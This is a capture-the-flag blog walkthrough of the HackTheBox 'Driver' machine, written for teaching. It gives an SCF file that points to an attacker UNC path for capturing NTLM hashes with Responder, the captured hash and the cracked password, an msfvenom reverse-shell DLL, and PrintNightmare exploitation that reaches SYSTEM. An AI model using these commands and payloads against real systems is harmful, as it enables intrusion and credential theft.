---
layout: post
title: Driver - Exploiting SCF files for Credential Theft and PrintNightmare for Privilege Escalation
date: 08/04/2024
author: Nehal Zaman
tags: ["scf file upload", "printnightmare"]
categories: [writeups]
render_with_liquid: false
---

![](/assets/images/writeups/driver/banner.png)

# INTRODUCTION

Hello everyone! [Driver](https://app.hackthebox.com/machines/Driver) is an easy Windows machine available on **HackTheBox**.

In this writeup, we'll delve into a technique called `SCF` file upload attack on `SMB` to steal credentials from a user with low privileges.

Following that, we'll exploit the notorious `PrintNightmare` vulnerability to elevate our privileges.

Now, let's dive right in!

# SCANNING

```
┌──(kali㉿kali)-[~/Documents/ctf/htb/driver]
└─$ rustscan -a 10.10.11.106 --ulimit 5000 | tee -a scan/rustscan.log
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
Real hackers hack time ⌛

[~] The config file is expected to be at "/home/kali/.rustscan.toml"
[~] Automatically increasing ulimit value to 5000.
Open 10.10.11.106:80
Open 10.10.11.106:135
Open 10.10.11.106:445
[~] Starting Script(s)
[>] Script to be run Some("nmap -vvv -p {{port}} {{ip}}")

[~] Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-04-05 12:23 EDT
Initiating Ping Scan at 12:23
Scanning 10.10.11.106 [2 ports]
Completed Ping Scan at 12:23, 0.34s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 12:23
Completed Parallel DNS resolution of 1 host. at 12:23, 0.01s elapsed
DNS resolution of 1 IPs took 0.01s. Mode: Async [#: 2, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating Connect Scan at 12:23
Scanning 10.10.11.106 [3 ports]
Completed Connect Scan at 12:23, 4.43s elapsed (3 total ports)
Nmap scan report for 10.10.11.106
Host is up, received syn-ack (0.34s latency).
Scanned at 2024-04-05 12:23:49 EDT for 4s

PORT    STATE    SERVICE      REASON
80/tcp  filtered http         no-response
135/tcp filtered msrpc        no-response
445/tcp filtered microsoft-ds no-response

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 4.84 seconds
```

To kick off our scanning process, we used `Rustscan`. It found ports `80`, `135`, and `445` as accessible on the target system.

```
┌──(kali㉿kali)-[~/Documents/ctf/htb/driver]
└─$ nmap -sC -sV -p80,135,445 10.10.11.106 -oN scan/nmap-targeted.log
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-04-05 12:25 EDT
Nmap scan report for 10.10.11.106
Host is up (0.65s latency).

PORT    STATE SERVICE      VERSION
80/tcp  open  http         Microsoft IIS httpd 10.0
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
| http-methods: 
|_  Potentially risky methods: TRACE
| http-auth: 
| HTTP/1.1 401 Unauthorized\x0D
|_  Basic realm=MFP Firmware Update Center. Please enter password for admin
|_http-server-header: Microsoft-IIS/10.0
135/tcp open  msrpc        Microsoft Windows RPC
445/tcp open  microsoft-ds Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)
Service Info: Host: DRIVER; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 7h00m00s, deviation: 0s, median: 7h00m00s
| smb2-time: 
|   date: 2024-04-05T23:25:36
|_  start_date: 2024-04-05T23:16:46
| smb-security-mode: 
|   account_used: <blank>
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 66.71 seconds
```

With this initial insight, we proceeded with a more in-depth `nmap` scan to gather detailed information about the services running on these ports:

- Port `80`: Running **Microsoft IIS httpd 10.0**
- Port `135`: Operating **Microsoft Windows RPC**
- Port `445`: Hosting **Microsoft Windows 7 - 10 microsoft-ds**

Furthermore, the scan hinted at potential authentication requirements for port `80`.

```
┌──(kali㉿kali)-[~/Documents/ctf/htb/driver]
└─$ nmap -sC -sV -p- -T4 10.10.11.106 -oN scan/nmap-full.log -Pn
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-04-05 12:28 EDT
Nmap scan report for 10.10.11.106
Host is up (0.24s latency).
Not shown: 65532 filtered tcp ports (no-response)
PORT     STATE SERVICE VERSION
80/tcp   open  http    Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
| http-auth: 
| HTTP/1.1 401 Unauthorized\x0D
|_  Basic realm=MFP Firmware Update Center. Please enter password for admin
135/tcp  open  msrpc   Microsoft Windows RPC
5985/tcp open  http    Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8084.57 seconds
```

Anticipating that there might be more ports hidden from our initial scans, we decided to conduct a thorough `nmap` scan to check all TCP ports. This extensive search revealed another open port, `5985`, which was running the `winrm` service.

# ENUMERATING RPC

```
┌──(kali㉿kali)-[~/Documents/ctf/htb/driver]
└─$ rpcclient -U="" 10.10.11.106
Password for [WORKGROUP\]:
Cannot connect to the server. The error encountered was NT_STATUS_LOGON_FAILURE.
```

We attempted to access `RPC` (**Remote Procedure Call**) without providing any credentials, hoping to gain access with null credentials. However, our attempt was unsuccessful.

Since we didn't have valid credentials at the time, we couldn't proceed further with the enumeration of `RPC` services.

# ENUMERATING SMB

```
┌──(kali㉿kali)-[~/Documents/ctf/htb/driver]
└─$ echo exit | smbclient -L \\\\10.10.11.106
Password for [WORKGROUP\kali]:
Access denied: Unable to establish a session.
```

We attempted to list the shares available through `SMB` (**Server Message Block**) without providing any credentials. Unfortunately, we were denied access.

Since we lacked valid credentials, we couldn't proceed with enumerating the SMB service.

# ENUMERATING WEB

![Homepage](/assets/images/writeups/driver/1.png)

Upon visiting the website's homepage, we encountered a basic authentication system.

![Authentication](/assets/images/writeups/driver/2.png)

Surprisingly, using the default credentials `admin:admin` granted us access.

![Firmware Upload](/assets/images/writeups/driver/3.png)

Exploring further, we discovered the `/fw_up.php` endpoint, which allowed us to upload firmware updates.

Additionally, a notice at the top of the page indicated that firmware updates could be uploaded through the UI, and they would be submitted to an `SMB` file share. A member of the testing team would then manually review the uploaded file and initiate testing.

This scenario presented an ideal opportunity for executing the `SCF` file upload attack.

# SCF FILE UPLOAD ATTACK

`SCF` (**Shell Command Files**) are typically utilized for basic operations such as displaying the Windows desktop or launching Windows Explorer. 

However, they can also be sneaky. An `SCF` file can access a specific `UNC` (**Universal Naming Convention**) path, essentially serving as a backdoor for an attacker. 

The provided code snippet below could be put within a text file and placed within a network share:

```
[Shell]
Command=2
IconFile=\\<ATTACKER_IP>\share\something.ico
[Taskbar]
Command=ToggleDesktop
```

![Homepage](/assets/images/writeups/driver/4.png)

We saved the file as an `SCF` file, which had the `.scf` extension. This made the file execute whenever the user browsed the share. We uploaded the `SCF` file via the web UI, and it got submitted to the `SMB` share.

After setting up, we could use `responder` to steal the hash of a user from the testing team who decided to check out the shared folder to review the file we uploaded.

```
┌──(kali㉿kali)-[~/Documents/ctf/htb/driver]
└─$ sudo responder -w --lm -v -I tun0 
                                         __
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
                   |__|

           NBT-NS, LLMNR & MDNS Responder 3.1.4.0

  To support this project:
  Github -> https://github.com/sponsors/lgandx
  Paypal  -> https://paypal.me/PythonResponder

  Author: Laurent Gaffie (laurent.gaffie@gmail.com)
  To kill this script hit CTRL-C


[+] Poisoners:
    LLMNR                      [ON]
    NBT-NS                     [ON]
    MDNS                       [ON]
    DNS                        [ON]
    DHCP                       [OFF]

[+] Servers:
    HTTP server                [ON]
    HTTPS server               [ON]
    WPAD proxy                 [ON]
    Auth proxy                 [OFF]
    SMB server                 [ON]
    Kerberos server            [ON]
    SQL server                 [ON]
    FTP server                 [ON]
    IMAP server                [ON]
    POP3 server                [ON]
    SMTP server                [ON]
    DNS server                 [ON]
    LDAP server                [ON]
    MQTT server                [ON]
    RDP server                 [ON]
    DCE-RPC server             [ON]
    WinRM server               [ON]
    SNMP server                [OFF]

[+] HTTP Options:
    Always serving EXE         [OFF]
    Serving EXE                [OFF]
    Serving HTML               [OFF]
    Upstream Proxy             [OFF]

[+] Poisoning Options:
    Analyze Mode               [OFF]
    Force WPAD auth            [OFF]
    Force Basic Auth           [OFF]
    Force LM downgrade         [ON]
    Force ESS downgrade        [ON]

[+] Generic Options:
    Responder NIC              [tun0]
    Responder IP               [10.10.16.17]
    Responder IPv6             [dead:beef:4::100f]
    Challenge set              [random]
    Don't Respond To Names     ['ISATAP', 'ISATAP.LOCAL']

[+] Current Session Variables:
    Responder Machine Name     [WIN-RNHXCEB40TA]
    Responder Domain Name      [GXP2.LOCAL]
    Responder DCE-RPC Port     [46040]

[+] Listening for events...                                                                                                                                                                                                                 

[SMB] NTLMv2 Client   : 10.10.11.106
[SMB] NTLMv2 Username : DRIVER\tony
[SMB] NTLMv2 Hash     : tony::DRIVER:d6f8fde8c6f68787:FED96348E2563CCCD99CD0F41516CC0B:0101000000000000E09B851EBF87DA013127FD2FA6CB4A9800000000020000000000000000000000
```

We obtained the `NTLM` hash belonging to the user named `tony`.

![](/assets/images/writeups/driver/5.png)

Afterwards, we managed to crack the password utilizing `hashcat`.

# SHELL AS TONY

We discovered that port `5985` was running the `winrm` service, and we had obtained credentials for a user named `tony`.

Knowing that if `tony` had membership in the `Remote Management Group`, we could leverage `evil-winrm` to establish a shell as `tony`.

```
┌──(kali㉿kali)-[~/Documents/ctf/htb/driver]
└─$ evil-winrm -i 10.10.11.106 -u 'tony' -p 'liltony'
                                        
Evil-WinRM shell v3.5
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\tony\Documents> 
```

Our attempt was successful, and we obtained a shell as `tony`.

# PRIVILEGE ESCALATION

```
*Evil-WinRM* PS C:\Users\tony\Documents\tools> Get-Process

Handles  NPM(K)    PM(K)      WS(K) VM(M)   CPU(s)     Id ProcessName
-------  ------    -----      ----- -----   ------     -- -----------
     40       4     1904       1400 ...67     2.13   2828 cmd
    113      10    10448       6820 ...45     4.13   3096 conhost
    306      13     1172       4156 ...02             352 csrss
    261      18     1232       4088 ...08             464 csrss
    200      13     3292      11956 ...02            2304 dllhost
    332      26    29860      48364 ...97             804 dwm
    511      27     8496      30732 ...32     0.39   2080 explorer
    507      27     8384      30676 ...32     0.42   2320 explorer
   1391      58    16404      60920 ...64    23.38   3192 explorer
    535      35    10248      35320 ...46     0.22   3768 explorer
      0       0        0          4     0               0 Idle
    956      23     4888      14600 ...01             580 lsass
    173      13     2620       8816 ...95            2460 msdtc
    471      38    15164      43236   299     1.19   4176 OneDrive
     53       6      724       3304 ...65     0.00   4260 PING
    300      18     6688      23396 ...81     0.73   3244 RuntimeBroker
    694      45    21740      27180 ...32            2832 SearchIndexer
    750      48    30032      70924 33077     0.75   3640 SearchUI
    185      12     2760      10524 ...02             848 sedsvc
    246       9     2512       6260 ...74             572 services
    643      31    13980      46524   252     0.39   3484 ShellExperienceHost
    344      15     3488      17728 ...47     0.34    800 sihost
     49       3      332       1168 ...56             276 smss
    379      22     5084      13824 ...12            1184 spoolsv
    637      46     7480      20072 ...24             300 svchost
    528      20     4884      16924 ...16             660 svchost
    519      17     3436       8952 ...91             712 svchost
   1360      53    14880      36336 ...16             824 svchost
    565      26    11204      18104 ...36             876 svchost
    437      22    23328      35096 ...58             900 svchost
    209      16     1972       8292 ...96             908 svchost
    764      27     6068      14112 ...40             996 svchost
    486      42    13504      24288 ...63            1384 svchost
    277      18     4880      14704 ...07            1536 svchost
    126      11     2992       9216 ...96            1552 svchost
    183      15     3404       9916 ...04            1644 svchost
    172      12     2044      12300 ...26     0.05   1652 svchost
    190      15     3632      15328 ...57            1656 svchost
    118       9     1384       6180 ...79            2624 svchost
     99       7     1120       5924 ...87            4036 svchost
    843       0      124        140     3               4 System
    277      27     4528      13700 ...17     0.50   2884 taskhostw
    138      11     2656      10396 ...22            1704 VGAuthService
    108       7     1312       5520 ...06            1696 vm3dservice
    100       8     1400       6036 ...28            1948 vm3dservice
    333      23     9108      21532 ...52            1620 vmtoolsd
    211      18     4928      15080 ...67     0.13   3032 vmtoolsd
     85       8      808       4640 ...73             456 wininit
    182       9     1820       8720 ...22             508 winlogon
    325      19     9060      19392 ...96            2496 WmiPrvSE
    802      31    57788      80268 ...68     2.70    744 wsmprovhost
    219      10     1536       7136 ...92             944 WUDFHost
```

We utilized the `Get-Process` cmdlet to list the running processes.

We noticed the presence of `spoolsv` in the list, indicating a potential vulnerability to the infamous `PrintNightmare` exploit.

`PrintNightmare` is a critical vulnerability that allows an attacker to execute code remotely and gain `SYSTEM` level privileges on Windows machines running the print spooler service.

This vulnerability stems from an authorization bypass flaw in the Print Spooler service (`spoolsv.exe`) on Windows systems. It enables authenticated remote users to install print drivers using the RPC call `RpcAddPrinterDriver` and specify a driver file located on a remote location. By exploiting this flaw, a malicious user can inject malicious DLLs during the installation of a print driver, thereby gaining `SYSTEM` level privileges on the target system.

```
┌──(kali㉿kali)-[~/Documents/ctf/htb/driver]
└─$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.16.17 LPORT=1337 -f dll -o reverse.dll
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 460 bytes
Final size of dll file: 9216 bytes
Saved as: reverse.dll
```

We generated a malicious DLL file to provide a reverse shell on the attacker's port `1337`.

Subsequently, we cloned the [CVE-2021-1675](https://github.com/calebstewart/CVE-2021-1675) repository and transferred the `CVE-2021-1675.ps1` and DLL file to the victim's box.

```
*Evil-WinRM* PS C:\Users\tony\Documents\tools> copy \\10.10.16.17\tools\CVE-2021-1675-PrintNightmare\CVE-2021-1675.ps1
*Evil-WinRM* PS C:\Users\tony\Documents\tools> copy \\10.10.16.17\tools\CVE-2021-1675-PrintNightmare\reverse.dll
```

Next, we imported the `cve-2021-1675.ps1` module and executed the `Invoke-nightmare` cmdlet, providing the path to the malicious DLL that we created.

```
*Evil-WinRM* PS C:\Users\tony\Documents\tools> powershell -ep bypass "Import-Module .\cve-2021-1675.ps1; Invoke-Nightmare -DLL C:\Users\tony\Documents\tools\reverse.dll"
[+] using user-supplied payload at C:\Users\tony\Documents\tools\reverse.dll
[!] ignoring NewUser and NewPassword arguments
[+] using pDriverPath = "C:\Windows\System32\DriverStore\FileRepository\ntprint.inf_amd64_f66d9eed7e835e97\Amd64\mxdwdrv.dll"
powershell.exe : Invoke-Nightmare : [!] AddPrinterDriverEx failed
    + CategoryInfo          : NotSpecified: (Invoke-Nightmar...DriverEx failed:String) [], RemoteException
    + FullyQualifiedErrorId : NativeCommandError
At line:1 char:36
+ ... 1-1675.ps1; Invoke-Nightmare -DLL C:\Users\tony\Documents\tools\rever ...
+                 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : NotSpecified: (:) [Write-Error], WriteErrorException
    + FullyQualifiedErrorId : Microsoft.PowerShell.Commands.WriteErrorException,Invoke-Nightmare
```

```
┌──(kali㉿kali)-[~/Documents/ctf/htb/driver]
└─$ nc -nlvp 1337
listening on [any] 1337 ...
connect to [10.10.16.17] from (UNKNOWN) [10.10.11.106] 49433
Microsoft Windows [Version 10.0.10240]
(c) 2015 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami 
whoami 
nt authority\system

C:\Windows\system32>
```

We successfully obtained a shell as the system `administrator`.

# CONCLUSION

In conclusion, our exploration revealed several open ports on the target system, including ports `80`, `135`, `445`, and `5985`. 

While port `135` hosted `RPC` and port `445` was for `SMB`, both required valid credentials for access. 

Fortunately, the web service on port `80` accepted default credentials (`admin:admin`), granting us access. Through the web interface, we discovered an opportunity to upload firmware updates, which were stored in `SMB`. We leveraged this to execute an `SCF` file upload attack, obtaining user credentials and ultimately gaining a shell.

Moreover, exploiting the notorious `PrintNightmare` vulnerability allowed us to escalate our privileges to `administrator` level, marking a successful completion of the challenge.

Thank you for accompanying this far, and looking forward to sharing more exploitations in the next one. Until next time!